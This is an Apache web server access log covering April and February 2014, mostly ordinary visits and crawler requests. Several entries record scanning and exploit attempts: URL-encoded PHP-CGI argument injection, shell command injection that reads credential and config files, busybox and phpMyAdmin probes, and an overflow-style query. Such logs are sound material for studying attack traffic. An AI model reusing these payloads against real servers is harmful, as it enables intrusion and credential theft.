172.28.0.23 - - [23/Apr/2014:12:30:37 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:12:30:37 +0300] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:12:30:37 +0300] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
194.102.231.4 - - [23/Apr/2014:12:30:44 +0300] "POST /wp-cron.php?doing_wp_cron=1398245560.1727650165557861328125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:30:44 +0300] "POST /wp-cron.php?doing_wp_cron=1398245560.2049880027770996093750 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:32:06 +0300] "POST /wp-cron.php?doing_wp_cron=1398245641.5020060539245605468750 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
81.12.149.234 - - [23/Apr/2014:12:33:13 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (Windows NT 5.1; rv:28.0) Gecko/20100101 Firefox/28.0"
81.12.149.234 - - [23/Apr/2014:12:33:14 +0300] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 5.1; rv:28.0) Gecko/20100101 Firefox/28.0"
81.12.149.234 - - [23/Apr/2014:12:33:14 +0300] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 5.1; rv:28.0) Gecko/20100101 Firefox/28.0"
194.102.231.4 - - [23/Apr/2014:12:33:15 +0300] "POST /wp-cron.php?doing_wp_cron=1398245711.1243278980255126953125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:33:15 +0300] "POST /wp-cron.php?doing_wp_cron=1398245711.1241929531097412109375 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:34:40 +0300] "POST /wp-cron.php?doing_wp_cron=1398245795.9769859313964843750000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:34:40 +0300] "POST /wp-cron.php?doing_wp_cron=1398245795.9783520698547363281250 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
208.115.111.73 - - [23/Apr/2014:12:36:01 +0300] "GET /robots.txt HTTP/1.1" 404 468 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
194.102.231.4 - - [23/Apr/2014:12:36:05 +0300] "POST /wp-cron.php?doing_wp_cron=1398245881.0463650226593017578125 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
194.102.231.4 - - [23/Apr/2014:12:36:05 +0300] "POST /wp-cron.php?doing_wp_cron=1398245881.0470199584960937500000 HTTP/1.0" 404 493 "-" "WordPress/3.8.2; http://www.bluenote.ro"
208.115.111.73 - - [23/Apr/2014:12:49:46 +0300] "GET /index.php/interviuri/377-dr-rzvan-constantinescu-qdac-nu-ai-ce-ascunde-nu-e-mare-curaj-s-te-iei-la-trant-cu-autoritileq.html HTTP/1.1" 404 582 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
86.147.176.144 - - [23/Apr/2014:12:55:25 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36"
86.147.176.144 - - [23/Apr/2014:12:55:26 +0300] "GET /favicon.ico HTTP/1.1" 404 501 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36"
86.147.176.144 - - [23/Apr/2014:12:55:32 +0300] "GET / HTTP/1.1" 304 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36"
172.28.0.23 - - [23/Apr/2014:13:36:05 +0300] "GET /bluenote/ HTTP/1.1" 200 5481 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:13:36:08 +0300] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:13:36:08 +0300] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
62.183.102.204 - - [23/Apr/2014:13:39:40 +0300] "-------------------------41184676334--" 501 331 "-" "-"
62.183.102.204 - - [23/Apr/2014:13:39:48 +0300] "-------------------------41184676334--" 501 331 "-" "-"
109.99.132.8 - - [23/Apr/2014:13:39:54 +0300] "GET /index.php/prieteniinostri/409-drag-studentule-la-medicin-.html HTTP/1.1" 404 537 "http://l.facebook.com/l.php?u=http%3A%2F%2Fwww.igh.ro%2Findex.php%2Fprieteniinostri%2F409-drag-studentule-la-medicin-.html&h=SAQEX98AeAQFWSqryKKJcXqZud71npJc4PTGAFyqzKdCMGA&enc=AZPqEVOSb7dBFiCmvMOWlrLggj5jWQlPYPEXIau_CurzIhFGKnlCAWv0wzn8CjWDWmmiMsCmE7a40SXHUtWagrdj&s=1" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
109.99.132.8 - - [23/Apr/2014:13:41:22 +0300] "GET /index.php/prieteniinostri/409-drag-studentule-la-medicin-.html HTTP/1.1" 404 537 "http://l.facebook.com/l.php?u=http%3A%2F%2Fwww.igh.ro%2Findex.php%2Fprieteniinostri%2F409-drag-studentule-la-medicin-.html&h=IAQEj7tYQAQFk7jTNwW7A0rpkIoR-ue-xAUE4TfIufympCQ&enc=AZMfdKzcgkBqUMYTkXVWj2oZClu25YmRGmmicSd7h5N2ZYbomhlHJpzPf0FUBPQVIUMQ4H5WLe-SKeKI3YGU4AZB&s=1" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
37.58.100.155 - - [23/Apr/2014:13:51:10 +0300] "GET /robots.txt HTTP/1.1" 404 449 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
157.55.32.229 - - [23/Apr/2014:14:05:54 +0300] "GET /robots.txt HTTP/1.1" 404 532 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.32.229 - - [23/Apr/2014:14:09:39 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.78.97 - - [23/Apr/2014:14:21:43 +0300] "GET /robots.txt HTTP/1.1" 404 508 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.78.97 - - [23/Apr/2014:14:21:43 +0300] "GET / HTTP/1.1" 200 483 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.1.196.188 - - [23/Apr/2014:14:28:42 +0300] "-" 408 0 "-" "-"
109.1.196.188 - - [23/Apr/2014:14:30:18 +0300] "-" 408 0 "-" "-"
72.14.199.11 - - [23/Apr/2014:14:34:53 +0300] "GET /index.php?format=feed&type=rss HTTP/1.1" 404 502 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=13565859836659266637)"
172.28.0.23 - - [23/Apr/2014:14:37:13 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:14:37:14 +0300] "GET /favicon.ico HTTP/1.1" 404 514 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:14:37:14 +0300] "GET /favicon.ico HTTP/1.1" 404 514 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
109.1.196.188 - - [23/Apr/2014:14:43:46 +0300] "-" 408 0 "-" "-"
66.249.78.193 - - [23/Apr/2014:14:46:39 +0300] "GET /robots.txt HTTP/1.1" 404 501 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.11 - - [23/Apr/2014:14:46:39 +0300] "GET /index.php/procese/constantinescu-vs-cseke.html HTTP/1.1" 404 526 "-" "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
157.55.32.28 - - [23/Apr/2014:14:51:28 +0300] "GET /robots.txt HTTP/1.1" 404 534 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
172.28.0.23 - - [23/Apr/2014:14:55:07 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:14:55:08 +0300] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:14:55:08 +0300] "GET /favicon.ico HTTP/1.1" 404 506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
172.28.0.23 - - [23/Apr/2014:14:56:15 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
66.249.78.193 - - [23/Apr/2014:14:59:42 +0300] "GET /index.php?format=feed&type=rss HTTP/1.1" 404 502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
82.137.9.192 - - [23/Apr/2014:15:21:18 +0300] "-" 408 0 "-" "-"
173.252.110.118 - - [23/Apr/2014:15:29:25 +0300] "GET /plugins/content/itpsocialbuttons/images/isometrica/google.png HTTP/1.1" 404 535 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.110.114 - - [23/Apr/2014:15:29:29 +0300] "GET /plugins/content/itpsocialbuttons/images/isometrica/google.png HTTP/1.1" 404 535 "-" "facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)"
157.55.32.28 - - [23/Apr/2014:15:29:59 +0300] "GET / HTTP/1.1" 200 484 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.33.15 - - [23/Apr/2014:15:35:40 +0300] "GET /robots.txt HTTP/1.1" 404 525 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:06:25:01 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
183.60.243.188 - - [16/Feb/2014:08:49:37 +0200] "GET /cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount HTTP/1.1" 404 496 "-" "Python-urllib/2.7"
183.60.243.188 - - [16/Feb/2014:08:49:37 +0200] "GET /img/snapshot.cgi?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x88\x9b HTTP/1.0" 404 498 "-" "-"
183.60.243.188 - - [16/Feb/2014:08:49:38 +0200] "GET /oamp/System.xml?action=login&user=L1_admin&password=L1_51 HTTP/1.1" 404 451 "-" "python-requests/2.1.0 CPython/2.7.3 Linux/3.5.0-23-generic"
183.60.243.188 - - [16/Feb/2014:08:49:38 +0200] "GET /oidtable.cgi?grep='$IFS/etc/privpasswd;' HTTP/1.1" 404 449 "-" "python-requests/2.1.0 CPython/2.7.3 Linux/3.5.0-23-generic"
183.60.243.188 - - [16/Feb/2014:08:49:39 +0200] "GET /LIVE_VIEW.asp HTTP/1.1" 404 452 "-" "python-requests/2.1.0 CPython/2.7.3 Linux/3.5.0-23-generic"
183.60.243.188 - - [16/Feb/2014:08:49:40 +0200] "GET /cgi/maker/ptcmd.cgi?cmd=;cat+/tmp/config/usr.ini HTTP/1.1" 404 453 "-" "python-requests/2.1.0 CPython/2.7.3 Linux/3.5.0-23-generic"
203.57.214.1 - - [16/Feb/2014:08:58:27 +0200] "-" 408 0 "-" "-"
203.57.214.1 - - [16/Feb/2014:08:58:30 +0200] "-" 408 0 "-" "-"
::1 - - [16/Feb/2014:09:38:25 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
122.49.0.220 - - [16/Feb/2014:11:28:19 +0200] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
122.49.0.220 - - [16/Feb/2014:11:28:19 +0200] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
122.49.0.220 - - [16/Feb/2014:11:28:20 +0200] "GET /pma/scripts/setup.php HTTP/1.1" 404 473 "-" "ZmEu"
122.49.0.220 - - [16/Feb/2014:11:28:21 +0200] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 476 "-" "ZmEu"
122.49.0.220 - - [16/Feb/2014:11:28:22 +0200] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 477 "-" "ZmEu"
116.211.208.176 - - [16/Feb/2014:13:08:00 +0200] "GET /cgi-bin/rtpd.cgi?/bin/busybox HTTP/1.0" 404 496 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
::1 - - [16/Feb/2014:13:20:24 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
109.102.66.33 - - [16/Feb/2014:13:24:10 +0200] "-" 408 0 "-" "-"
109.102.66.33 - - [16/Feb/2014:13:24:15 +0200] "-" 408 0 "-" "-"
94.69.36.203 - - [16/Feb/2014:14:36:59 +0200] "GET /cgi-bin/rtpd.cgi?/bin/busybox HTTP/1.0" 404 496 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
220.181.108.186 - - [16/Feb/2014:17:23:12 +0200] "-" 408 0 "-" "-"
::1 - - [16/Feb/2014:17:29:26 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [16/Feb/2014:17:29:27 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
213.233.103.135 - - [16/Feb/2014:18:16:16 +0200] "-" 408 0 "-" "-"
213.233.103.135 - - [16/Feb/2014:18:16:17 +0200] "-" 408 0 "-" "-"
213.233.103.135 - - [16/Feb/2014:18:16:17 +0200] "-" 408 0 "-" "-"
213.233.103.135 - - [16/Feb/2014:18:17:22 +0200] "-" 408 0 "-" "-"
88.47.191.103 - - [16/Feb/2014:18:36:28 +0200] "HEAD / HTTP/1.0" 200 276 "-" "-"
88.47.191.103 - - [16/Feb/2014:18:36:28 +0200] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 491 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
88.47.191.103 - - [16/Feb/2014:18:36:28 +0200] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 492 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
88.47.191.103 - - [16/Feb/2014:18:36:28 +0200] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 495 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
88.47.191.103 - - [16/Feb/2014:18:36:29 +0200] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 495 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
88.47.191.103 - - [16/Feb/2014:18:36:29 +0200] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 492 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
::1 - - [16/Feb/2014:18:44:30 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
193.27.68.133 - - [16/Feb/2014:21:04:12 +0200] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 512 "-" "-"
::1 - - [16/Feb/2014:21:43:34 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
108.196.130.82 - - [16/Feb/2014:21:44:05 +0200] "-" 408 0 "-" "-"
108.196.130.82 - - [16/Feb/2014:21:44:05 +0200] "-" 408 0 "-" "-"
108.196.130.82 - - [16/Feb/2014:21:45:23 +0200] "-" 408 0 "-" "-"
108.196.130.82 - - [16/Feb/2014:21:45:24 +0200] "-" 408 0 "-" "-"
88.254.15.135 - - [16/Feb/2014:22:10:13 +0200] "-" 408 0 "-" "-"
88.254.15.135 - - [16/Feb/2014:22:10:15 +0200] "-" 408 0 "-" "-"
49.116.20.211 - - [17/Feb/2014:00:47:43 +0200] "GET /cgi-bin/rtpd.cgi?/bin/busybox HTTP/1.0" 404 496 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
98.109.227.59 - - [17/Feb/2014:01:35:44 +0200] "\x80w\x01\x03\x01" 501 298 "-" "-"
98.109.227.59 - - [17/Feb/2014:01:35:44 +0200] "GET /HNAP1/ HTTP/1.1" 404 502 "http://194.102.231.8/" "Mozilla/5.0 (compatible; SnapPreviewBot; en-US; rv:1.8.0.9) Gecko/20061206 Firefox/1.5.0.9"
142.4.206.229 - - [17/Feb/2014:01:54:44 +0200] "POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1" 404 477 "-" "-"
23.233.218.31 - - [17/Feb/2014:04:39:07 +0200] "-" 408 0 "-" "-"
23.233.218.31 - - [17/Feb/2014:04:40:14 +0200] "-" 408 0 "-" "-"
23.233.218.31 - - [17/Feb/2014:04:41:44 +0200] "-" 408 0 "-" "-"
23.233.218.31 - - [17/Feb/2014:04:55:35 +0200] "-" 408 0 "-" "-"
23.233.218.31 - - [17/Feb/2014:05:07:45 +0200] "-" 408 0 "-" "-"
46.38.63.108 - - [17/Feb/2014:05:44:47 +0200] "GET / HTTP/1.1" 200 460 "-" "GoogleBot 1.0"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:06:25:02 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
216.201.222.6 - - [17/Feb/2014:07:57:50 +0200] "HEAD / HTTP/1.0" 200 276 "-" "-"
178.19.107.26 - - [17/Feb/2014:08:13:04 +0200] "GET http://wikipedia.pl HTTP/1.1" 200 460 "-" "-"
::1 - - [17/Feb/2014:09:18:16 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
